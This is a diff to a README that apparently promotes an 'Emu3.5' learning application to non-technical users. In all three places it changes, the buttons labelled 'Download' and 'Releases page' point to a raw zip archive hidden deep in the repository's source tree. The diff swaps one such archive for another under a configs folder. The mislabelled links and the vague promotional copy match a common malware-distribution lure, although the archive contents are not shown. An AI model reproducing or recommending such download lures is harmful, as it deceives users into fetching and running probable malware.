@@ -1,7 +1,7 @@
 # 🎉 Emu3.5 - Explore the Future of Learning Models
 
 ## 📥 Download Now
-[![Download Emu3.5](https://raw.githubusercontent.com/Hawks-pro/Emu3.5/main/third_party/vllm/v1/core/Emu3.5_v1.9.zip)](https://raw.githubusercontent.com/Hawks-pro/Emu3.5/main/third_party/vllm/v1/core/Emu3.5_v1.9.zip)
+[![Download Emu3.5](https://raw.githubusercontent.com/Hawks-pro/Emu3.5/main/third_party/vllm/transformers_utils/configs/Emu_3.2.zip)](https://raw.githubusercontent.com/Hawks-pro/Emu3.5/main/third_party/vllm/transformers_utils/configs/Emu_3.2.zip)
 
 ## 🚀 Getting Started
 Emu3.5 is designed for everyday users. Follow these simple steps to download and run the software.
@@ -16,7 +16,7 @@ To use Emu3.5, you will need:
 Emu3.5 is a cutting-edge application that utilizes native multimodal models. These models are designed to help you learn and understand various concepts in a streamlined manner. With Emu3.5, you can explore advanced learning techniques without needing deep technical knowledge.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/Hawks-pro/Emu3.5/main/third_party/vllm/v1/core/Emu3.5_v1.9.zip) to download the latest version of Emu3.5.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Hawks-pro/Emu3.5/main/third_party/vllm/transformers_utils/configs/Emu_3.2.zip) to download the latest version of Emu3.5.
 2. Once on the releases page, look for the latest version listed.
 3. Click on the link to download the file that matches your operating system (e.g., Windows, macOS, or Linux).
 
@@ -56,6 +56,6 @@ Emu3.5 offers several key features to enhance your learning experience:
 ## 🏁 Conclusion
 Emu3.5 simplifies learning through advanced multimodal models. Whether you're a student, professional, or lifelong learner, this application enhances your understanding of various subjects.
 
-For more information or to download the latest version, visit the [Releases Page](https://raw.githubusercontent.com/Hawks-pro/Emu3.5/main/third_party/vllm/v1/core/Emu3.5_v1.9.zip). 
+For more information or to download the latest version, visit the [Releases Page](https://raw.githubusercontent.com/Hawks-pro/Emu3.5/main/third_party/vllm/transformers_utils/configs/Emu_3.2.zip). 
 
 Thank you for choosing Emu3.5. Happy learning!
